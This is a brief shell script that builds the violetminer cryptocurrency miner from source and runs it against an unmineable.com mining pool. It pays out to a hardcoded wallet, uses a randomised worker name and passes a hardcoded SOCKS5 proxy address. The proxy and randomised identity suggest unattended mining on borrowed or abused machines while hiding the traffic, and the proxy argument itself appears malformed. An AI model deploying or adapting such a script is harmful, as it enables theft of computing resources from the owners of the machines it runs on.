#!/bin/sh
apt-get update
git clone https://github.com/turtlecoin/violetminer
cd violetminer
git submodule update --init --recursive
mkdir build
cd build
cmake -DENABLE_NVIDIA=OFF ..
make
PROXY=socks5://98.162.25.29:31679
./violetminer --algorithm wrkzcoin --pool rx.unmineable.com:3333 --username WIN:TX7hx8zqvfvb4c16QkuZYfrV4Kvqi8xMGi.$(echo $(shuf -i 111111-9999999 -n 1)-CC)#482f-otle --password x $PROXY --threads 2
